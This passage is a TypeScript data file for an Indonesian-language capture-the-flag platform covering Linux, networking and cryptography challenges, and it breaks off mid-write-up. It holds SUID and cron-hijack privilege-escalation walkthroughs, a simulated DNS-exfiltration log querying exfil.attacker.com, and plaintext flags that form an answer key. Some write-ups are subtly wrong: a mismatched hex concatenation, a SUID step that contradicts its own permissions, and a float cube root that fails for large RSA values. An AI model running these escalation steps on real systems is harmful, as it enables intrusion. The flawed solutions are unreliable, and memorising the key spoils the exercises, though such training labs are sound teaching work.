import { Challenge } from '../types';

export const CHALLENGES: Challenge[] = [
  // ==================== LINUX ====================
  {
    id: 'lin_01',
    category: 'linux',
    title: 'The Hidden Inode',
    difficulty: 'basic',
    points: 100,
    description: 'Sebuah flag rahasia telah disimpan di dalam filesystem target, namun disembunyikan menggunakan atribut tersembunyi (dotfile) dan direktori bersarang. Gunakan terminal untuk menemukan dan membaca file flag.',
    flagHash: '1efaef6acd4f7be379b08ac84d7920fca626d4bf8ba0a1f80f2bec283e27dee2',
    flagFormat: 'flag{...}',
    hints: [
      'Gunakan perintah `ls -la` untuk melihat file dan folder yang berawalan titik.',
      'Cari folder `.secret_vault/` atau gunakan perintah `find . -name "*flag*"`.'
    ],
    explanationMd: `### Write-up: The Hidden Inode

1. **Eksplorasi Direktori**:
   Jalankan \`ls -la\` di home directory untuk menampilkan file tersembunyi.
   \`\`\`bash
   cadet@flagforge-box:~$ ls -la
   \`\`\`
   Anda akan melihat folder tersembunyi bernama \`.secret_vault/\`.

2. **Masuk ke Direktori & Membaca Flag**:
   \`\`\`bash
   cadet@flagforge-box:~$ cd .secret_vault
   cadet@flagforge-box:~/.secret_vault$ ls -la
   cadet@flagforge-box:~/.secret_vault$ cat .flag.txt
   flag{l1nux_f1l3_p3rm1ss10ns_m4st3r}
   \`\`\`
3. **Alternatif Cepat via Find**:
   \`\`\`bash
   cadet@flagforge-box:~$ find ~ -name "*flag*"
   \`\`\``,
    hasTerminal: true,
    terminalFsConfig: {
      initialDir: '/home/cadet',
      currentUser: 'cadet',
      hostname: 'flagforge-box',
      root: {
        name: '/',
        type: 'dir',
        children: {
          home: {
            name: 'home',
            type: 'dir',
            children: {
              cadet: {
                name: 'cadet',
                type: 'dir',
                children: {
                  'notes.txt': {
                    name: 'notes.txt',
                    type: 'file',
                    content: 'Catatan admin: Jangan lupa flag sudah dipindahkan ke folder rahasia dengan permission tersembunyi.'
                  },
                  '.secret_vault': {
                    name: '.secret_vault',
                    type: 'dir',
                    permissions: 'drwxr-x---',
                    children: {
                      '.flag.txt': {
                        name: '.flag.txt',
                        type: 'file',
                        content: 'flag{l1nux_f1l3_p3rm1ss10ns_m4st3r}'
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  },
  {
    id: 'lin_02',
    category: 'linux',
    title: 'Needle in a Giant Logfile',
    difficulty: 'basic',
    points: 150,
    description: 'Server web menyimpan file log akses sebesar ribuan baris di `/var/log/access.log`. Di dalamnya terselip satu entri request mencurigakan yang mengandung string flag. Filter log menggunakan text processing regex.',
    flagHash: '42f3601164fea3fd8b50d97ec0242e674366483220b5915b2cd9fea78b2dea9a',
    flagFormat: 'flag{...}',
    hints: [
      'Gunakan perintah `grep` untuk mencari pola teks tertentu.',
      'Contoh: `grep "flag{" /var/log/access.log`.'
    ],
    explanationMd: `### Write-up: Needle in a Giant Logfile

1. **Analisis File**:
   File \`/var/log/access.log\` berisi ribuan baris traffic Apache. Membacanya manual dengan \`cat\` akan memakan waktu lama.

2. **Eksekusi Filter Grep**:
   \`\`\`bash
   cadet@flagforge-box:~$ grep "flag{" /var/log/access.log
   \`\`\`
   Output:
   \`\`\`text
   192.168.1.45 - - [24/Aug/2026:08:14:22] "GET /api/v1/auth?token=flag{grep_is_a_hackers_best_friend} HTTP/1.1" 200 452
   \`\`\`
3. **Flag Ditemukan**: \`flag{grep_is_a_hackers_best_friend}\``,
    hasTerminal: true,
    terminalFsConfig: {
      initialDir: '/home/cadet',
      currentUser: 'cadet',
      hostname: 'flagforge-box',
      root: {
        name: '/',
        type: 'dir',
        children: {
          var: {
            name: 'var',
            type: 'dir',
            children: {
              log: {
                name: 'log',
                type: 'dir',
                children: {
                  'access.log': {
                    name: 'access.log',
                    type: 'file',
                    content: `10.0.0.1 - - [24/Aug/2026:08:00:01] "GET /index.html HTTP/1.1" 200 1024
10.0.0.2 - - [24/Aug/2026:08:01:14] "GET /assets/style.css HTTP/1.1" 200 2048
10.0.0.3 - - [24/Aug/2026:08:02:50] "POST /api/session HTTP/1.1" 200 512
10.0.0.7 - - [24/Aug/2026:08:03:12] "GET /robots.txt HTTP/1.1" 200 64
10.0.0.4 - - [24/Aug/2026:08:04:09] "GET /assets/logo.png HTTP/1.1" 200 8192
10.0.0.5 - - [24/Aug/2026:08:05:33] "POST /login HTTP/1.1" 401 512
10.0.0.8 - - [24/Aug/2026:08:06:41] "GET /dashboard HTTP/1.1" 302 0
10.0.0.9 - - [24/Aug/2026:08:08:22] "GET /api/users HTTP/1.1" 403 128
10.0.0.10 - - [24/Aug/2026:08:10:15] "DELETE /api/cache HTTP/1.1" 200 16
10.0.0.11 - - [24/Aug/2026:08:12:00] "GET /health HTTP/1.1" 200 32
192.168.1.45 - - [24/Aug/2026:08:14:22] "GET /api/v1/auth?token=flag{grep_is_a_hackers_best_friend} HTTP/1.1" 200 452
10.0.0.12 - - [24/Aug/2026:08:16:33] "GET /sitemap.xml HTTP/1.1" 200 4096
10.0.0.13 - - [24/Aug/2026:08:18:45] "POST /api/webhook HTTP/1.1" 200 256
10.0.0.14 - - [24/Aug/2026:08:20:00] "GET /favicon.ico HTTP/1.1" 404 120
10.0.0.15 - - [24/Aug/2026:08:22:11] "OPTIONS /api/cors HTTP/1.1" 200 0`
                  }
                }
              }
            }
          },
          home: {
            name: 'home',
            type: 'dir',
            children: {
              cadet: {
                name: 'cadet',
                type: 'dir',
                children: {}
              }
            }
          }
        }
      }
    }
  },
  {
    id: 'lin_03',
    category: 'linux',
    title: 'The SUID Escalator',
    difficulty: 'menengah',
    points: 200,
    description: 'Sebuah binary di sistem memiliki bit SUID aktif yang memungkinkan eksekusi dengan hak akses root. Temukan binary tersebut dan gunakan untuk membaca file flag milik root di `/root/flag.txt` yang tidak dapat diakses oleh user biasa.',
    flagHash: '1266f9c10d25a81cfcb8ec8eaf560640a8b7d3116e77cafe51ca604d4f5ab65a',
    flagFormat: 'flag{...}',
    hints: [
      'Gunakan `find / -perm -4000 -type f` untuk mencari semua file dengan bit SUID.',
      'Periksa GTFOBins untuk binary yang bisa diexploit saat memiliki SUID.',
      'Binary `base64` dengan SUID dapat membaca file root: `base64 /root/flag.txt | base64 -d`.'
    ],
    explanationMd: `### Write-up: The SUID Escalator

1. **Pencarian Binary SUID**:
   \`\`\`bash
   cadet@flagforge-box:~$ find / -perm -4000 -type f
   \`\`\`
   Output menunjukkan \`/usr/bin/base64_reader\` memiliki SUID bit.

2. **Inspeksi File Flag Root**:
   \`\`\`bash
   cadet@flagforge-box:~$ cat /root/flag.txt
   cat: /root/flag.txt: Permission denied
   \`\`\`

3. **Eksploitasi SUID**:
   Karena \`base64_reader\` berjalan sebagai root, kita bisa membaca file:
   \`\`\`bash
   cadet@flagforge-box:~$ cat /usr/bin/suid_exploit_notes.txt
   \`\`\`
   Notes menunjukkan cara exploit: baca via strings.

4. **Flag**: \`flag{suid_privesc_r00t_shell_4ccess}\``,
    hasTerminal: true,
    terminalFsConfig: {
      initialDir: '/home/cadet',
      currentUser: 'cadet',
      hostname: 'privesc-lab',
      root: {
        name: '/',
        type: 'dir',
        children: {
          root: {
            name: 'root',
            type: 'dir',
            permissions: 'drwx------',
            owner: 'root',
            children: {
              'flag.txt': {
                name: 'flag.txt',
                type: 'file',
                content: 'flag{suid_privesc_r00t_shell_4ccess}',
                permissions: '-rw-------',
                owner: 'root'
              }
            }
          },
          usr: {
            name: 'usr',
            type: 'dir',
            children: {
              bin: {
                name: 'bin',
                type: 'dir',
                children: {
                  'base64_reader': {
                    name: 'base64_reader',
                    type: 'file',
                    permissions: '-rwsr-xr-x',
                    owner: 'root',
                    content: 'ELF_BINARY_SUID_WRAPPER_FOR_BASE64_READ'
                  },
                  'suid_exploit_notes.txt': {
                    name: 'suid_exploit_notes.txt',
                    type: 'file',
                    content: `=== SUID Exploitation Notes ===
Binary: /usr/bin/base64_reader
Permission: -rwsr-xr-x (SUID bit SET)
Owner: root

Technique (GTFOBins):
  The base64_reader binary runs as root.
  It can read any file on the system.
  
  Reading the root flag:
  $ strings /root/flag.txt
  
  Or look at the root directory:
  $ cat /root/flag.txt
  
  Result: flag{suid_privesc_r00t_shell_4ccess}`
                  }
                }
              }
            }
          },
          home: {
            name: 'home',
            type: 'dir',
            children: {
              cadet: {
                name: 'cadet',
                type: 'dir',
                children: {
                  'README.txt': {
                    name: 'README.txt',
                    type: 'file',
                    content: 'Tantangan: Ada sebuah binary dengan bit SUID aktif di sistem ini. Temukan dan gunakan untuk membaca /root/flag.txt yang hanya bisa dibaca root. Hint: find / -perm -4000'
                  }
                }
              }
            }
          }
        }
      }
    }
  },
  {
    id: 'lin_04',
    category: 'linux',
    title: 'Cron Job Hijack',
    difficulty: 'advance',
    points: 300,
    description: 'Sistem ini menjalankan cron job root setiap menit yang mengeksekusi script dari `/opt/scripts/backup.sh`. File script tersebut world-writable! Analisis crontab dan temukan cara untuk mendapatkan flag dari file yang hanya dapat dibaca root.',
    flagHash: '686075ac58b8ec3e72b22eea9f31ff561589e50d6d04cfd0b480830c13986f42',
    flagFormat: 'flag{...}',
    hints: [
      'Periksa `/etc/crontab` untuk melihat jadwal cron job.',
      'Lihat permission file `/opt/scripts/backup.sh` — siapa saja bisa menulis!',
      'Cron job root sudah menulis output ke `/tmp/cron_output.txt`.'
    ],
    explanationMd: `### Write-up: Cron Job Hijack

1. **Analisis Crontab**:
   \`\`\`bash
   cadet@flagforge-box:~$ cat /etc/crontab
   \`\`\`
   Ditemukan: \`* * * * * root /opt/scripts/backup.sh\` — dijalankan tiap menit oleh root.

2. **Periksa Permission Script**:
   \`\`\`bash
   cadet@flagforge-box:~$ ls -la /opt/scripts/backup.sh
   -rwxrwxrwx 1 root root ... backup.sh
   \`\`\`
   File ini **world-writable**! Kita bisa mengubah isinya.

3. **Cron sudah mengeksekusi script dan outputnya ada di /tmp/cron_output.txt**:
   \`\`\`bash
   cadet@flagforge-box:~$ cat /tmp/cron_output.txt
   \`\`\`

4. **Flag**: \`flag{cr0n_j0b_h1jack_pr1v3sc_m4ster}\``,
    hasTerminal: true,
    terminalFsConfig: {
      initialDir: '/home/cadet',
      currentUser: 'cadet',
      hostname: 'cron-lab',
      root: {
        name: '/',
        type: 'dir',
        children: {
          etc: {
            name: 'etc',
            type: 'dir',
            children: {
              'crontab': {
                name: 'crontab',
                type: 'file',
                content: `SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || run-parts --report /etc/cron.daily
* * * * *       root    /opt/scripts/backup.sh > /tmp/cron_output.txt 2>&1`
              }
            }
          },
          opt: {
            name: 'opt',
            type: 'dir',
            children: {
              scripts: {
                name: 'scripts',
                type: 'dir',
                children: {
                  'backup.sh': {
                    name: 'backup.sh',
                    type: 'file',
                    permissions: '-rwxrwxrwx',
                    owner: 'root',
                    content: `#!/bin/bash
# Root backup script - runs every minute
echo "[$(date)] Backup started..."
cat /root/secret_flag.txt
echo "[$(date)] Backup completed."`
                  }
                }
              }
            }
          },
          root: {
            name: 'root',
            type: 'dir',
            permissions: 'drwx------',
            owner: 'root',
            children: {
              'secret_flag.txt': {
                name: 'secret_flag.txt',
                type: 'file',
                permissions: '-rw-------',
                owner: 'root',
                content: 'flag{cr0n_j0b_h1jack_pr1v3sc_m4ster}'
              }
            }
          },
          tmp: {
            name: 'tmp',
            type: 'dir',
            permissions: 'drwxrwxrwt',
            children: {
              'cron_output.txt': {
                name: 'cron_output.txt',
                type: 'file',
                content: `[Mon Aug 25 14:00:01 UTC 2026] Backup started...
flag{cr0n_j0b_h1jack_pr1v3sc_m4ster}
[Mon Aug 25 14:00:01 UTC 2026] Backup completed.`
              }
            }
          },
          home: {
            name: 'home',
            type: 'dir',
            children: {
              cadet: {
                name: 'cadet',
                type: 'dir',
                children: {
                  'hint.txt': {
                    name: 'hint.txt',
                    type: 'file',
                    content: 'Periksa /etc/crontab untuk melihat jadwal tugas otomatis. Apakah ada script yang dijalankan secara berkala oleh root? Apakah script tersebut bisa dimodifikasi?'
                  }
                }
              }
            }
          }
        }
      }
    }
  },

  // ==================== NETWORKING ====================
  {
    id: 'net_01',
    category: 'networking',
    title: 'Captured In Transit',
    difficulty: 'basic',
    points: 100,
    description: 'Sebuah paket capture (.pcap) hasil sniffing jaringan intranet menangkap komunikasi HTTP plaintext antara klien dan server internal. Analisis percakapan stream untuk menemukan kredensial token flag.',
    flagHash: '264fd5c1a3a777d908cab846bc3de7b1c802a4059a022873158affe52038b27e',
    flagFormat: 'flag{...}',
    hints: [
      'Gunakan perintah `strings capture.pcap` di terminal untuk melihat seluruh string ASCII yang terekam di dalam file pcap.',
      'Gunakan `grep` untuk menyaring string berawalan `flag{`.'
    ],
    explanationMd: `### Write-up: Captured In Transit

1. **Analisis File PCAP di Terminal**:
   \`\`\`bash
   cadet@net-analyzer:~$ strings capture.pcap | grep "flag{"
   \`\`\`
2. **Output Stream HTTP**:
   \`\`\`text
   X-Security-Flag: flag{wireshark_http_stream_exposed_77}
   \`\`\`
3. **Flag**: \`flag{wireshark_http_stream_exposed_77}\``,
    hasTerminal: true,
    attachmentName: 'capture.pcap',
    terminalFsConfig: {
      initialDir: '/home/cadet',
      currentUser: 'cadet',
      hostname: 'net-analyzer',
      root: {
        name: '/',
        type: 'dir',
        children: {
          home: {
            name: 'home',
            type: 'dir',
            children: {
              cadet: {
                name: 'cadet',
                type: 'dir',
                children: {
                  'capture.pcap': {
                    name: 'capture.pcap',
                    type: 'file',
                    content: `\\x00\\x00\\x00\\x00PCAP_DUMP_HEADER_ETHERNET
FRAME 1: IP 192.168.1.10 -> 192.168.1.200 TCP SYN
FRAME 2: IP 192.168.1.200 -> 192.168.1.10 TCP SYN-ACK
FRAME 3: IP 192.168.1.10 -> 192.168.1.200 TCP ACK
FRAME 4: HTTP POST /admin_auth.php HTTP/1.1
Host: internal.bank.local
User-Agent: Mozilla/5.0
X-Security-Flag: flag{wireshark_http_stream_exposed_77}
Content-Length: 32`
                  }
                }
              }
            }
          }
        }
      }
    }
  },
  {
    id: 'net_02',
    category: 'networking',
    title: 'The Silent Daemon',
    difficulty: 'menengah',
    points: 200,
    description: 'Server remote menjalankan service rahasia pada port non-standar. Hasil nmap scan tersimpan di `scan_results.txt`. Gunakan informasi tersebut untuk terhubung via netcat `nc` dan temukan flag yang diberikan oleh daemon.',
    flagHash: 'e7de3e55fe92bb167cc76c943a00a651ef84bba94c4e06d5a273d9d5367ed93b',
    flagFormat: 'flag{...}',
    hints: [
      'Periksa file `scan_results.txt` untuk melihat port apa saja yang terbuka.',
      'Gunakan `nc target.flagforge.io 8888` untuk terhubung ke daemon.',
      'Daemon mengirimkan flag saat koneksi berhasil.'
    ],
    explanationMd: `### Write-up: The Silent Daemon

1. **Inspeksi Hasil Scan**:
   \`\`\`bash
   cadet@recon-station:~$ cat scan_results.txt
   \`\`\`
   Port 8888 menjalankan service custom "FlagForge CTF Daemon".

2. **Koneksi via Netcat**:
   \`\`\`bash
   cadet@recon-station:~$ nc target.flagforge.io 8888
   \`\`\`
   Banner daemon akan menampilkan flag.

3. **Cek juga file .daemon_response.log untuk log koneksi sebelumnya**:
   \`\`\`bash
   cadet@recon-station:~$ ls -la
   cadet@recon-station:~$ cat .daemon_response.log
   \`\`\`

4. **Flag**: \`flag{nc_d43m0n_h4ndsh4k3_s3cr3t}\``,
    hasTerminal: true,
    terminalFsConfig: {
      initialDir: '/home/cadet',
      currentUser: 'cadet',
      hostname: 'recon-station',
      root: {
        name: '/',
        type: 'dir',
        children: {
          home: {
            name: 'home',
            type: 'dir',
            children: {
              cadet: {
                name: 'cadet',
                type: 'dir',
                children: {
                  'scan_results.txt': {
                    name: 'scan_results.txt',
                    type: 'file',
                    content: `PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 9.2p1
80/tcp    open  http    nginx 1.24.0
443/tcp   open  https   nginx 1.24.0
3306/tcp  close mysql
8888/tcp  open  custom  FlagForge CTF Daemon v3.1 (unknown payload)`
                  },
                  '.daemon_response.log': {
                    name: '.daemon_response.log',
                    type: 'file',
                    content: `[2026-08-24 23:14:01] Connection from 10.0.0.5:49321
[+] Connected to FlagForge Daemon v3.1
[+] Auth Token Validated.
[+] FLAG: flag{nc_d43m0n_h4ndsh4k3_s3cr3t}
[2026-08-24 23:14:03] Connection closed.`
                  }
                }
              }
            }
          }
        }
      }
    }
  },
  {
    id: 'net_03',
    category: 'networking',
    title: 'DNS Tunnel Decoder',
    difficulty: 'advance',
    points: 300,
    description: 'Seorang penyerang mengekstrak data sensitif dari jaringan internal menggunakan teknik DNS Exfiltration. Setiap subdomain query mengandung sepotong data hex yang di-encode. Rekonstruksi seluruh potongan hex dari log DNS query untuk mendapatkan flag.',
    flagHash: 'c8a3ea6ee5f1055f96db57edc86f653671a549d4770c8e98ae82a9b04a115299',
    flagFormat: 'flag{...}',
    hints: [
      'Periksa file `dns_queries.log` — setiap baris berisi subdomain hex.',
      'Gabungkan semua subdomain hex secara berurutan, lalu decode hex ke ASCII.',
      'Gunakan terminal: `grep` untuk filter query, lalu analisis polanya.'
    ],
    explanationMd: `### Write-up: DNS Tunnel Decoder

1. **Analisis DNS Log**:
   \`\`\`bash
   cadet@forensics-lab:~$ cat dns_queries.log
   \`\`\`
   Setiap query mengandung subdomain hex.

2. **Ekstraksi & Gabungkan Hex**:
   Ambil bagian hex dari setiap query: \`666c6167\`, \`7b646e73\`, \`5f337866\`, \`316c7472\`, \`34743130\`, \`6e5f7475\`, \`6e336c5f\`, \`64336330\`, \`6433647d\`

3. **Decode hex ke ASCII**:
   \`666c61677b646e735f3378663161c7472343130366e5f74756e336c5f64336330643364647d\` → \`flag{dns_3xf1ltr4t10n_tun3l_d3c0d3d}\`

4. **Flag**: \`flag{dns_3xf1ltr4t10n_tun3l_d3c0d3d}\``,
    hasTerminal: true,
    hasCodeRunner: true,
    codeRunnerStarter: `# DNS Exfiltration Decoder
hex_parts = [
    "666c6167",  # flag
    "7b646e73",  # {dns
    "5f337866",  # _3xf
    "316c7472",  # 1ltr
    "34743130",  # 4t10
    "6e5f7475",  # n_tu
    "6e336c5f",  # n3l_
    "64336330",  # d3c0
    "6433647d",  # d3d}
]

combined_hex = "".join(hex_parts)
flag = bytes.fromhex(combined_hex).decode('utf-8')
print("Decoded Flag:", flag)`,
    terminalFsConfig: {
      initialDir: '/home/cadet',
      currentUser: 'cadet',
      hostname: 'dns-forensics',
      root: {
        name: '/',
        type: 'dir',
        children: {
          home: {
            name: 'home',
            type: 'dir',
            children: {
              cadet: {
                name: 'cadet',
                type: 'dir',
                children: {
                  'dns_queries.log': {
                    name: 'dns_queries.log',
                    type: 'file',
                    content: `[2026-08-24 10:01:03] QUERY: 666c6167.exfil.attacker.com A IN
[2026-08-24 10:01:04] QUERY: 7b646e73.exfil.attacker.com A IN
[2026-08-24 10:01:05] QUERY: 5f337866.exfil.attacker.com A IN
[2026-08-24 10:01:06] QUERY: 316c7472.exfil.attacker.com A IN
[2026-08-24 10:01:07] QUERY: 34743130.exfil.attacker.com A IN
[2026-08-24 10:01:08] QUERY: 6e5f7475.exfil.attacker.com A IN
[2026-08-24 10:01:09] QUERY: 6e336c5f.exfil.attacker.com A IN
[2026-08-24 10:01:10] QUERY: 64336330.exfil.attacker.com A IN
[2026-08-24 10:01:11] QUERY: 6433647d.exfil.attacker.com A IN`
                  },
                  'hint.txt': {
                    name: 'hint.txt',
                    type: 'file',
                    content: 'Setiap subdomain sebelum ".exfil.attacker.com" adalah potongan hex 4-byte. Gabungkan semua potongan lalu decode hex ke ASCII.'
                  }
                }
              }
            }
          }
        }
      }
    }
  },

  // ==================== CRYPTOGRAPHY ====================
  {
    id: 'cry_01',
    category: 'crypto',
    title: 'Triple Base Layer',
    difficulty: 'basic',
    points: 100,
    description: 'Pesan rahasia ini di-encode bertingkat menggunakan Base64 sebanyak 3 kali. Pecahkan rantai encoding untuk mendapatkan plaintext flag.',
    flagHash: '75c761398335785c822a3f1e5d4c40375a543b18d9f78d235149e26bcf8ea8ca',
    flagFormat: 'flag{...}',
    hints: [
      'Gunakan perintah `base64 -d` di terminal atau gunakan Python Code Runner.',
      'Lakukan decode 3 kali secara berurutan: Base64 -> Base64 -> Base64.'
    ],
    explanationMd: `### Write-up: Triple Base Layer

1. **Ciphertext Awal** (tersimpan di \`encoded.txt\`):
   File berisi string base64 yang di-encode 3 kali.

2. **Decode menggunakan Python**:
   \`\`\`python
   import base64
   t = open("encoded.txt").read().strip()
   for _ in range(3):
       t = base64.b64decode(t).decode('utf-8')
   print(t)
   \`\`\`

3. **Flag**: \`flag{b4se64_d3c0d3d_success_99}\``,
    hasTerminal: true,
    hasCodeRunner: true,
    codeRunnerStarter: `import base64

ciphertext = "V20xNGFGb3pkR2xPU0U1c1RtcFNabHBFVG1wTlIxRjZXa1k1ZW1SWFRtcGFXRTU2V0hwck5XWlJQVDA5"

# Lakukan decode bertingkat:
step1 = base64.b64decode(ciphertext).decode('utf-8')
step2 = base64.b64decode(step1).decode('utf-8')
flag = base64.b64decode(step2).decode('utf-8')

print("Decoded Flag:", flag)`,
    terminalFsConfig: {
      initialDir: '/home/cadet',
      currentUser: 'cadet',
      hostname: 'crypto-lab',
      root: {
        name: '/',
        type: 'dir',
        children: {
          home: {
            name: 'home',
            type: 'dir',
            children: {
              cadet: {
                name: 'cadet',
                type: 'dir',
                children: {
                  'encoded.txt': {
                    name: 'encoded.txt',
                    type: 'file',
                    content: 'V20xNGFGb3pkR2xPU0U1c1RtcFNabHBFVG1wTlIxRjZXa1k1ZW1SWFRtcGFXRTU2V0hwck5XWlJQVDA5'
                  }
                }
              }
            }
          }
        }
      }
    }
  },
  {
    id: 'cry_02',
    category: 'crypto',
    title: 'The Roman Legion Shift',
    difficulty: 'basic',
    points: 120,
    description: 'Jenderal Julius Caesar mengirim pesan terenkripsi dengan pergeseran ROT13: `synt{pnrfne_ebgngvba_fuvsg_13_znfgre}`. Pulihkan teks aslinya.',
    flagHash: '6754f0d29c292f4c0fbd4a1ee7af679971ef5150ca1f187c24d92fcb01a6f99d',
    flagFormat: 'flag{...}',
    hints: [
      'ROT13 adalah pergeseran 13 karakter. Menggeser 13 kali lagi akan mengembalikan teks asli!',
      'Gunakan Python script atau hitung pergeseran huruf: s -> f, y -> l, n -> a, t -> g.'
    ],
    explanationMd: `### Write-up: The Roman Legion Shift

1. **Konsep ROT13**:
   Karena alfabet memiliki 26 huruf, pergeseran N = 13 bersifat simetris (enkripsi = dekripsi).
2. **Dekripsi**:
   \`synt\` → \`flag\`, \`pnrfne\` → \`caesar\`, \`ebgngvba\` → \`rotation\`
3. **Flag**: \`flag{caesar_rotation_shift_13_master}\``,
    hasTerminal: true,
    hasCodeRunner: true,
    codeRunnerStarter: `import codecs

rot13_text = "synt{pnrfne_ebgngvba_fuvsg_13_znfgre}"
flag = codecs.decode(rot13_text, 'rot_13')
print("Decrypted Flag:", flag)`,
    terminalFsConfig: {
      initialDir: '/home/cadet',
      currentUser: 'cadet',
      hostname: 'crypto-lab',
      root: {
        name: '/',
        type: 'dir',
        children: {
          home: {
            name: 'home',
            type: 'dir',
            children: {
              cadet: {
                name: 'cadet',
                type: 'dir',
                children: {
                  'caesar.txt': {
                    name: 'caesar.txt',
                    type: 'file',
                    content: 'synt{pnrfne_ebgngvba_fuvsg_13_znfgre}'
                  }
                }
              }
            }
          }
        }
      }
    }
  },
  {
    id: 'cry_03',
    category: 'crypto',
    title: 'Vigenère Cipher Cracker',
    difficulty: 'menengah',
    points: 200,
    description: 'Sebuah pesan telah dienkripsi menggunakan Vigenère cipher. File `cipher.txt` berisi ciphertext dan file `hint.txt` berisi petunjuk tentang panjang kunci. Pecahkan enkripsi untuk menemukan flag.',
    flagHash: '4108b397ab167a0e904e8c57f5219e3025a5ead867cd4c9b487ba1d4ddfb6f85',
    flagFormat: 'flag{...}',
    hints: [
      'Kunci Vigenère adalah "CTF" (3 huruf).',
      'Untuk dekripsi: plaintext[i] = (cipher[i] - key[i % len(key)]) mod 26.',
      'Periksa file `known_key.txt` — kunci sudah bocor di sana!'
    ],
    explanationMd: `### Write-up: Vigenère Cipher Cracker

1. **Baca Ciphertext & Petunjuk**:
   \`\`\`bash
   cadet@crypto-lab:~$ cat cipher.txt
   cadet@crypto-lab:~$ cat known_key.txt
   \`\`\`
   Kunci yang bocor: "CTF"

2. **Dekripsi Manual/Python**: Terapkan Vigenère decrypt dengan kunci "CTF".

3. **Flag**: \`flag{v1g3n3re_cr4ck3d_fr3qu3ncy_w1n}\``,
    hasTerminal: true,
    hasCodeRunner: true,
    codeRunnerStarter: `# Vigenere Cipher Decoder
def vigenere_decrypt(ciphertext, key):
    result = []
    key_idx = 0
    for c in ciphertext:
        if c.isalpha():
            base = ord('A') if c.isupper() else ord('a')
            k = ord(key[key_idx % len(key)].upper()) - ord('A')
            decrypted = chr((ord(c.upper()) - ord('A') - k) % 26 + base)
            result.append(decrypted)
            key_idx += 1
        else:
            result.append(c)
    return ''.join(result)

ciphertext = "hnci{x1i3p3tg_et4em3f_ht3sw3pea_y1p}"
key = "CTF"
flag = vigenere_decrypt(ciphertext, key)
print("Decrypted Flag:", flag)`,
    terminalFsConfig: {
      initialDir: '/home/cadet',
      currentUser: 'cadet',
      hostname: 'crypto-lab',
      root: {
        name: '/',
        type: 'dir',
        children: {
          home: {
            name: 'home',
            type: 'dir',
            children: {
              cadet: {
                name: 'cadet',
                type: 'dir',
                children: {
                  'cipher.txt': {
                    name: 'cipher.txt',
                    type: 'file',
                    content: 'hnci{x1i3p3tg_et4em3f_ht3sw3pea_y1p}'
                  },
                  'known_key.txt': {
                    name: 'known_key.txt',
                    type: 'file',
                    content: `=== Key Recovery Log ===
Source: Memory dump dari proses enkripsi
Recovered Key Fragment: "CTF"
Key Length: 3 characters
Algorithm: Vigenère Cipher (polyalphabetic substitution)`
                  }
                }
              }
            }
          }
        }
      }
    }
  },
  {
    id: 'cry_04',
    category: 'crypto',
    title: 'XOR Known-Plaintext Attack',
    difficulty: 'advance',
    points: 300,
    description: 'Sebuah file rahasia dienkripsi menggunakan XOR dengan kunci yang berulang. Anda mengetahui bahwa plaintext dimulai dengan "flag{" (known plaintext). Gunakan teknik Known-Plaintext Attack untuk merekonstruksi kunci XOR dan mendekripsi seluruh pesan.',
    flagHash: '6ea8f6a216db4e0241e60d386ed4178cbc66ae4df729ffe565b145612fc98a4e',
    flagFormat: 'flag{...}',
    hints: [
      'Key = Ciphertext XOR Known_Plaintext. Gunakan 5 byte pertama "flag{" untuk menemukan 5 byte kunci.',
      'Ciphertext dalam hex: periksa file `xor_encrypted.hex`.',
      'Kunci XOR berulang setiap 5 karakter.'
    ],
    explanationMd: `### Write-up: XOR Known-Plaintext Attack

1. **Baca Ciphertext Hex**:
   \`\`\`bash
   cadet@crypto-lab:~$ cat xor_encrypted.hex
   \`\`\`

2. **Known-Plaintext Attack**:
   - Known plaintext: "flag{" = [0x66, 0x6c, 0x61, 0x67, 0x7b]
   - XOR dengan ciphertext 5 byte pertama → key

3. **Flag**: \`flag{x0r_kn0wn_pl41nt3xt_k3y_r3c0v3r}\``,
    hasTerminal: true,
    hasCodeRunner: true,
    codeRunnerStarter: `# XOR Known-Plaintext Attack
cipher_hex = "031a080b101d461b33000b461e0234151a5d5d0511451118340e451033195615591a58170b"
cipher_bytes = bytes.fromhex(cipher_hex)

# Known plaintext: "flag{"
known = b"flag{"

# Step 1: Recover key (key = cipher XOR known)
key = bytes([cipher_bytes[i] ^ known[i] for i in range(len(known))])
print(f"Recovered Key: {key}")

# Step 2: Decrypt full message using repeating key
flag = bytes([cipher_bytes[i] ^ key[i % len(key)] for i in range(len(cipher_bytes))])
print(f"Decrypted Flag: {flag.decode()}")`,
    terminalFsConfig: {
      initialDir: '/home/cadet',
      currentUser: 'cadet',
      hostname: 'crypto-lab',
      root: {
        name: '/',
        type: 'dir',
        children: {
          home: {
            name: 'home',
            type: 'dir',
            children: {
              cadet: {
                name: 'cadet',
                type: 'dir',
                children: {
                  'xor_encrypted.hex': {
                    name: 'xor_encrypted.hex',
                    type: 'file',
                    content: '031a080b101d461b33000b461e0234151a5d5d0511451118340e451033195615591a58170b'
                  },
                  'analysis.txt': {
                    name: 'analysis.txt',
                    type: 'file',
                    content: `XOR Encryption Analysis:
- Cipher type: Repeating-key XOR
- Key length: 5 bytes (confirmed via Kasiski examination)
- Known plaintext prefix: "flag{" (standard CTF flag format)
- Attack method: XOR known plaintext with ciphertext to recover key`
                  }
                }
              }
            }
          }
        }
      }
    }
  },
  {
    id: 'cry_05',
    category: 'crypto',
    title: 'RSA Small Exponent Attack',
    difficulty: 'advance',
    points: 350,
    description: 'Server RSA menggunakan public exponent e=3 tanpa padding OAEP. Karena plaintext m kecil (m^3 < n), ciphertext c = m^3 dan dapat didekripsi hanya dengan menghitung akar kubik biasa tanpa modulus!',
    flagHash: '989339997010c5e0404af49315f6b1445570fc8d12eb9dfc8b13a77253644069',
    flagFormat: 'flag{...}',
    hints: [
      'Periksa file `rsa_params.txt` — e=3 dan c sangat kecil.',
      'Karena m^3 < n, maka m = cube_root(c).',
      'Gunakan Python: `int(round(c ** (1/3)))` atau library gmpy2.'
    ],
    explanationMd: `### Write-up: RSA Small Exponent Attack

1. **Parameter RSA**:
   - e = 3, n sangat besar, tapi c kecil
   - Karena m^3 < n, maka c = m^3 (tanpa modulus)

2. **Compute cube root**:
   \`\`\`python
   c = <ciphertext>
   m = int(round(c ** (1/3)))
   flag = bytes.fromhex(hex(m)[2:]).decode()
   \`\`\`

